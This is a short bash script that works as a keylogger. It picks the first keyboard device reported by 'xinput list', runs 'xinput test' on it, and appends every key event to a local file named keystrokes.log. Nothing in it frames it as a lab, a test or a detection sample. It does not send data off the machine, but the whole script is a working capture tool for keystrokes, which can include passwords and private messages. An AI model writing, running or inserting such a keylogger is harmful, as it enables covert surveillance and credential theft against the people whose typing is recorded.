#!/bin/bash

OUTPUT_FILE="keystrokes.log"

# Ensure the output file exists
touch $OUTPUT_FILE

# Get the id of the keyboard device
KEYBOARD_ID=$(xinput list | grep -i 'keyboard' | grep -o 'id=[0-9]*' | grep -o '[0-9]*' | head -n 1)

# Capture keystrokes and append to the output file
xinput test $KEYBOARD_ID | while read -r line; do
    echo "$line" >> $OUTPUT_FILE
done